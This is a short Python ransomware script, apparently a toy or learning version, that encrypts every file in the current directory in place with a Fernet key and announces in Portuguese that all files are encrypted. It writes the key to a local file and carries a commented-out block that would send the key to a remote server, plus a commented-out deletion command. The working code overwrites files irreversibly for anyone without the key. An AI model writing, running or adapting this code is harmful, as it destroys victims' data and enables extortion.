import socket
import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
	if file in ["ware.py", "main.key" ,"noware.py"]:
		continue
	if os.path.isfile(file):
		files.append(file)

print(f"Ficheiros Criptografados: {files}")

key = Fernet.generate_key()

#server = input("The server that will recv the key: ")
#port = int(input("The port of server: "))

#try:
#	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#		s.connect((server, port))
#		s.sendall(key)


#except Exception as e:
#	print("Server unreachable!")


with open("main.key","wb") as tkey:
	tkey.write(key)



for file in files:
	with open(file,"rb") as tfile:
		content = tfile.read()
	content_encrypted = Fernet(key).encrypt(content)

	with open(file, "wb") as tfile:
		tfile.write(content_encrypted)

#os.system("rm pi.key")
print(f" Todos os ficheiros foram criptografados!! ")
